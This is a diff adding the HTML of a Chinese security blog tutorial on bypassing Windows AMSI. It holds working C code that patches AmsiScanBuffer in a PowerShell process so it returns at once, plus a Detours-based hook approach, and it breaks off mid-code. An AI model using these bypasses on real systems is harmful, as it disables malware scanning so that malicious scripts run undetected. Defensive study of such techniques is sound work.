@@ -1,0 +1,405 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>Bypass AMSI | 0pen1的博客</title>
+  <meta name="author" content="0pen1">
+  
+  <meta name="description" content="Bypass AMSIAMSI介绍反恶意软件扫描接口（Antimalware Scan Interface）简称AMSI，是微软在Windows中阻止恶意脚本执行的解决方案。AMSI通过分析将要执行的脚本，然后根据是否发现恶意内容来决定执行或者阻止。
+下面是微软官方的介绍：
+引自：https://docs.microsoft.com/zh-cn/windows/win32/amsi/antimalware-scan-interface-portal
+123Windows反恶意软件扫描接口 (AMSI) 是一种通用接口标准，可让应用程序和服务与计算机上存在的任何反恶意软件产品集成。 AMSI 为最终用户及其数据、应用程序和工作负荷提供增强的恶意软件防护。AMSI 与反恶意软件供应商无关;它旨在允许当今反恶意软件产品提供的最常见恶意软件扫描和保护技术，这些反恶意软件产品可以集成到应用程序中。 它支持调用结构，允许文件和内存或流扫描、内容源 URL&amp;#x2F;IP 信誉检查和其他技术。AMSI 还支持会话的概念，以便反恶意软件供应商可以关联不同的扫描请求。 例如，恶意有效负载的不同片段可以关联起来，以做出更明智的决策，仅通过单独查看这些片段，这更难到达。
+
+目前，在Windows10中以下组件已经集成了AMSI：
+
+用户帐户控制，或 UAC (EXE、COM、MSI 或 ActiveX的)
+PowerShell (脚本、交互式使用和动态代码评估)
+Windows脚本主机 (wscript.exe和cscript.exe)
+JavaScript 和 VBScript
+OfficeVBA 宏
+
+并且 从 Windows 10 上运行的 .NET Framework 4.8 开始，运行时通过实现反恶意软件扫描接口(AMSI) 的反恶意软件解决方案来触发扫描。https://docs.microsoft.com/zh-cn/dotnet/framework/whats-new/
+AMSI的架构（图片来自微软官方）"> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="Bypass AMSI"/>
+  <meta property="og:site_name" content="0pen1的博客"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">0pen1的博客</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class=""></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class=""></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class=""></i>About
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> Bypass AMSI</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <h1 id="Bypass-AMSI"><a href="#Bypass-AMSI" class="headerlink" title="Bypass AMSI"></a>Bypass AMSI</h1><h3 id="AMSI介绍"><a href="#AMSI介绍" class="headerlink" title="AMSI介绍"></a>AMSI介绍</h3><p>反恶意软件扫描接口（Antimalware Scan Interface）简称AMSI，是微软在Windows中阻止恶意脚本执行的解决方案。AMSI通过分析将要执行的脚本，然后根据是否发现恶意内容来决定执行或者阻止。</p>
+<p>下面是微软官方的介绍：</p>
+<p>引自：<a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/windows/win32/amsi/antimalware-scan-interface-portal">https://docs.microsoft.com/zh-cn/windows/win32/amsi/antimalware-scan-interface-portal</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Windows反恶意软件扫描接口 (AMSI) 是一种通用接口标准，可让应用程序和服务与计算机上存在的任何反恶意软件产品集成。 AMSI 为最终用户及其数据、应用程序和工作负荷提供增强的恶意软件防护。</span><br><span class="line">AMSI 与反恶意软件供应商无关;它旨在允许当今反恶意软件产品提供的最常见恶意软件扫描和保护技术，这些反恶意软件产品可以集成到应用程序中。 它支持调用结构，允许文件和内存或流扫描、内容源 URL&#x2F;IP 信誉检查和其他技术。</span><br><span class="line">AMSI 还支持会话的概念，以便反恶意软件供应商可以关联不同的扫描请求。 例如，恶意有效负载的不同片段可以关联起来，以做出更明智的决策，仅通过单独查看这些片段，这更难到达。</span><br></pre></td></tr></table></figure>
+
+<p>目前，在Windows10中以下组件已经集成了AMSI：</p>
+<ul>
+<li>用户帐户控制，或 UAC (EXE、COM、MSI 或 ActiveX的)</li>
+<li>PowerShell (脚本、交互式使用和动态代码评估)</li>
+<li>Windows脚本主机 (wscript.exe和cscript.exe)</li>
+<li>JavaScript 和 VBScript</li>
+<li>OfficeVBA 宏</li>
+</ul>
+<p>并且 从 Windows 10 上运行的 .NET Framework 4.8 开始，运行时通过实现反恶意软件扫描接口(AMSI) 的反恶意软件解决方案来触发扫描。<a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/dotnet/framework/whats-new/">https://docs.microsoft.com/zh-cn/dotnet/framework/whats-new/</a></p>
+<p>AMSI的架构（图片来自微软官方）</p>
+<p><img src="Bypass-AMSI.assets/amsi7archi.jpg" alt="the AMSI architecture"></p>
+<h3 id="技术原理"><a href="#技术原理" class="headerlink" title="技术原理"></a>技术原理</h3><p>启动powershell后执行一段敏感字符，发现powershell拒绝执行并且报毒。</p>
+<p><img src="Bypass-AMSI.assets/image-20220215163919903.png" alt="image-20220215163919903"></p>
+<p>使用x64dbg附加到powershell进程，查看符号可以看到加载了amsi.dll。这个amsi.dll便是AMSI的本体，它存在于C:\Windows\System32\amsi.dll</p>
+<p><img src="Bypass-AMSI.assets/image-20220215163512615.png" alt="image-20220215163512615"></p>
+<p>接下来我们直接跟进调试一下，首先在AmsiScanBuffer下一个断点。</p>
+<p><img src="Bypass-AMSI.assets/image-20220216140251149.png" alt="image-20220216140251149"></p>
+<p>在powershell中输入“Invoke-Mimikatz”并回车</p>
+<p><img src="Bypass-AMSI.assets/image-20220216143730617.png" alt="image-20220216143730617"></p>
+<p>程序执行到中断点处查看以下rdx（第二个参数）。</p>
+<p><img src="Bypass-AMSI.assets/image-20220216143825991.png" alt="image-20220216143825991"></p>
+<p>继续执行到函数的ret，单步执行跳出函数平衡堆栈查看[rsp+28]（第六个参数），</p>
+<p><img src="Bypass-AMSI.assets/image-20220216142259733.png" alt="image-20220216142259733"></p>
+<p>由于是第六个参数是保存在堆栈的，同时传入的是一个指向AMSI_RESULT结构体(枚举类型)的指针，所以我们需要去查看一下指针指向的值。查看0000004DDD20E908 地址可以看到保存的数值是8000（HEX），表示字符串为非敏感字符。</p>
+<p><img src="Bypass-AMSI.assets/image-20220216144053617.png" alt="image-20220216144053617"></p>
+<p>将此处内存手动修改为1（HEX）后继续运行，可以看到已经绕过了AMSI。</p>
+<p><img src="Bypass-AMSI.assets/image-20220216144332220.png" alt="image-20220216144332220"></p>
+<p>接下来我们将介绍几种方法来绕过AMSI。</p>
+<h3 id="基于内存补丁的方法绕过AMSI"><a href="#基于内存补丁的方法绕过AMSI" class="headerlink" title="基于内存补丁的方法绕过AMSI"></a>基于内存补丁的方法绕过AMSI</h3><p>通过对执行流程进行跟踪，发现字符串是否敏感是通过amsi.dll中的AmsiScanBuffer函数判断的。所以我们可以先考虑使用较为简单的内存补丁的方式对该函数进行修补使其失去作用。</p>
+<p>代码和手工的操作流程基本相同：</p>
+<ol>
+<li>创建一个powershell进程</li>
+<li>获取amsiscanbuffer函数地址</li>
+<li>修改函数内存空间属性</li>
+<li>修补函数执行体</li>
+</ol>
+<h4 id="手工流程"><a href="#手工流程" class="headerlink" title="手工流程"></a>手工流程</h4><p>创建一个powershell进程,然后使用调试器附加到powershell进程。</p>
+<p><img src="Bypass-AMSI.assets/image-20220215172006235.png" alt="image-20220215172006235"></p>
+<p>定位到AmsiScanBuffer函数的位置</p>
+<p><img src="Bypass-AMSI.assets/image-20220215172211137.png" alt="image-20220215172211137"></p>
+<p>将AmsiScanBuffer函数修改成直接返回（因为AmsiScanBuffer的返回值是通过第六个参数HRESULT*，并且这个指针指向的地址处默认为零，所以可以通过直接ret的方式返回）</p>
+<p><img src="Bypass-AMSI.assets/image-20220215172314068.png" alt="image-20220215172314068"></p>
+<p>成功绕过AMSI。</p>
+<p><img src="Bypass-AMSI.assets/image-20220215172431459.png" alt="image-20220215172431459"></p>
+<h4 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h4><p>代码实现比较简单，这里直接附上一个别人的代码。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	STARTUPINFOA si = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	PROCESS_INFORMATION pi = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	si.cb = <span class="keyword">sizeof</span>(si);</span><br><span class="line"></span><br><span class="line">	CreateProcessA(<span class="literal">NULL</span>, (LPSTR)<span class="string">&quot;powershell -NoExit dir&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi);</span><br><span class="line"></span><br><span class="line">	HMODULE hAmsi = LoadLibraryA(<span class="string">&quot;amsi.dll&quot;</span>);</span><br><span class="line">	LPVOID pAmsiScanBuffer = GetProcAddress(hAmsi, <span class="string">&quot;AmsiScanBuffer&quot;</span>);</span><br><span class="line"></span><br><span class="line">	Sleep(<span class="number">500</span>);</span><br><span class="line"></span><br><span class="line">	DWORD oldProtect;</span><br><span class="line">	<span class="keyword">char</span> patch = <span class="number">0xc3</span>;</span><br><span class="line"></span><br><span class="line">	VirtualProtectEx(pi.hProcess, (LPVOID)pAmsiScanBuffer, <span class="number">1</span>, PAGE_EXECUTE_READWRITE, &amp;oldProtect);</span><br><span class="line">	WriteProcessMemory(pi.hProcess, (LPVOID)pAmsiScanBuffer, &amp;patch, <span class="keyword">sizeof</span>(<span class="keyword">char</span>),<span class="literal">NULL</span>);</span><br><span class="line">	VirtualProtectEx(pi.hProcess, (LPVOID)pAmsiScanBuffer, <span class="number">1</span>, oldProtect, <span class="literal">NULL</span>);</span><br><span class="line">	CloseHandle(pi.hProcess);</span><br><span class="line">	CloseHandle(pi.hThread);</span><br><span class="line">	FreeLibrary(hAmsi);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="基于API-Hook和DLL注入的方式绕过AMSI"><a href="#基于API-Hook和DLL注入的方式绕过AMSI" class="headerlink" title="基于API Hook和DLL注入的方式绕过AMSI"></a>基于API Hook和DLL注入的方式绕过AMSI</h3><h4 id="函数hook"><a href="#函数hook" class="headerlink" title="函数hook"></a>函数hook</h4><p>函数hook是一种可以在函数调用前对其进行控制的方法。作为攻击者，我们可以利用这项技术做很多事情，比如：记录参数、控制函数的执行、覆盖传入函数的参数、修改函数的返回值。所以要想达到绕过AMSI的效果我们需要hook AmsiScanBuffer这个函数，好消息是Microsoft 提供了一个叫detours的开源库来帮我们完成这个工作，该库使用Trampoline（蹦床） hook的方法来进行函数hook。Trampoline hook的工作方式是：存储目标函数的副本，然后用jmp指令覆盖目标函数的开头，这个跳转将我们发送到我们作为攻击者控制的函数，因此称为Trampoline hook。</p>
+<p>下面的代码片段展示了如何使用detours库来hook MessageBox函数并覆盖参数：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;detours.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">int</span><span class="params">(WINAPI* OriginalMessageBox)</span><span class="params">(HWND hWnd, LPCWSTR lpText, LPCWSTR lpCaption, UINT uType)</span> </span>= MessageBox;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> WINAPI _MessageBox(HWND hWnd, LPCSTR lpText, LPCTSTR lpCaption, UINT uType) &#123;</span><br><span class="line">    <span class="keyword">return</span> OriginalMessageBox(<span class="literal">NULL</span>, <span class="string">L&quot;We&#x27;ve used detours to hook MessageBox&quot;</span>, <span class="string">L&quot;Hooked Window&quot;</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[+] Hooking MessageBox&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    </span><br><span class="line">    DetourRestoreAfterWith();</span><br><span class="line">    DetourTransactionBegin();</span><br><span class="line">    DetourUpdateThread(GetCurrentThread());</span><br><span class="line">    DetourAttach(&amp;(PVOID&amp;)OriginalMessageBox, _MessageBox);</span><br><span class="line">    DetourTransactionCommit();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[+] Message Box Hooked&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    MessageBox(<span class="literal">NULL</span>, <span class="string">L&quot;My Message&quot;</span>, <span class="string">L&quot;My Caption&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[+] Unhooking MessageBox&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    DetourUpdateThread(GetCurrentThread());</span><br><span class="line">    DetourDetach(&amp;(PVOID&amp;)OriginalMessageBox, _MessageBox);</span><br><span class="line">    DetourTransactionCommit();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[+] Message Box Unhooked&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>有了这些知识，我们就能够从本质上控制AmsiScanBuffer函数的所有方面。所以现在我们创建一个测试的项目，它接受一个字符串，然后使用AmsiScanBuffer来扫描字符串中的恶意内容。</p>
+<p>代码如下：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;amsi.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;system_error&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">&quot;amsi.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EICAR <span class="meta-string">&quot;hello&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">const</span> <span class="keyword">char</span>* <span class="title">GetResultDescription</span><span class="params">(HRESULT hRes)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* description;</span><br><span class="line">    <span class="built_in"><span class="keyword">switch</span></span> (hRes)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> AMSI_RESULT_CLEAN:</span><br><span class="line">        description = <span class="string">&quot;AMSI_RESULT_CLEAN&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> AMSI_RESULT_NOT_DETECTED:</span><br><span class="line">        description = <span class="string">&quot;AMSI_RESULT_NOT_DETECTED&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> AMSI_RESULT_BLOCKED_BY_ADMIN_START:</span><br><span class="line">        description = <span class="string">&quot;AMSI_RESULT_BLOCKED_BY_ADMIN_START&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> AMSI_RESULT_BLOCKED_BY_ADMIN_END:</span><br><span class="line">        description = <span class="string">&quot;AMSI_RESULT_BLOCKED_BY_ADMIN_END&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> AMSI_RESULT_DETECTED:</span><br><span class="line">        description = <span class="string">&quot;AMSI_RESULT_DETECTED&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        description = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> description;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    HAMSICONTEXT amsiContext;</span><br><span class="line">    HRESULT hResult = S_OK;</span><br><span class="line">    AMSI_RESULT res = AMSI_RESULT_CLEAN;</span><br><span class="line">    HAMSISESSION hSession = <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line">    LPCWSTR fname = <span class="string">L&quot;EICAR&quot;</span>;</span><br><span class="line">    BYTE* sample = (BYTE*)EICAR;</span><br><span class="line">    ULONG size = <span class="built_in">strlen</span>(EICAR);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">ZeroMemory</span>(&amp;amsiContext, <span class="built_in"><span class="keyword">sizeof</span></span>(amsiContext));</span><br><span class="line"></span><br><span class="line">    hResult = <span class="built_in">AmsiInitialize</span>(<span class="string">L&quot;AmsiHook&quot;</span>, &amp;amsiContext);</span><br><span class="line">    <span class="keyword">if</span> (hResult != S_OK) &#123;</span><br><span class="line">        std::cout &lt;&lt; std::<span class="built_in">system_category</span>().<span class="built_in">message</span>(hResult) &lt;&lt; std::endl;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;[-] AmsiInitialize Failed&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">        <span class="keyword">return</span> hResult;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    hResult = <span class="built_in">AmsiOpenSession</span>(amsiContext, &amp;hSession);</span><br><span class="line">    <span class="keyword">if</span> (hResult != S_OK) &#123;</span><br><span class="line">        std::cout &lt;&lt; std::<span class="built_in">system_category</span>().<span class="built_in">message</span>(hResult) &lt;&lt; std::endl;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;[-] AmsiOpenSession Failed&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">        <span class="keyword">return</span> hResult;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    hResult = <span class="built_in">AmsiScanBuffer</span>(amsiContext, sample, size, fname, hSession, &amp;res);</span><br><span class="line">    <span class="keyword">if</span> (hResult != S_OK) &#123;</span><br><span class="line">        std::cout &lt;&lt; std::<span class="built_in">system_category</span>().<span class="built_in">message</span>(hResult) &lt;&lt; std::endl;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;[-] AmsiScanBuffer Failed &quot;</span> &lt;&lt; std::endl;</span><br><span class="line">        <span class="keyword">return</span> hResult;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Anything above 32767 is considered malicious</span></span><br><span class="line">    std::cout &lt;&lt; <span class="built_in">GetResultDescription</span>(res) &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>程序输出</p>
+<p><img src="Bypass-AMSI.assets/image-20220216180026448.png" alt="image-20220216180026448"></p>
+<p>现在，我们有了一个用于测试AmsiScanBuffer的项目。这意味着我们可以通过实现一些类似于我们在hook MessageBox时使用的东西来尝试本地hook AmsiScanBuffer函数。下面的代码用一个安全的字符串替换了一个危险的字符串(EICAR测试中的字符串)，使得AmsiScanBuffer函数返回了一个安全的消息。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;amsi.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;detours.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;system_error&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">&quot;amsi.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EICAR <span class="meta-string">&quot;X5O!P%@AP[4\\PZX54(P^)7CC)7&#125;$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SAFE <span class="meta-string">&quot;SafeString&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Converts number given out by AmsiScanBuffer into a readable string</span></span><br><span class="line"><span class="function"><span class="keyword">const</span> <span class="keyword">char</span>* <span class="title">GetResultDescription</span><span class="params">(HRESULT hRes)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* description;</span><br><span class="line">    <span class="keyword">switch</span> (hRes)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> AMSI_RESULT_CLEAN:</span><br><span class="line">        description = <span class="string">&quot;AMSI_RESULT_CLEAN&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> 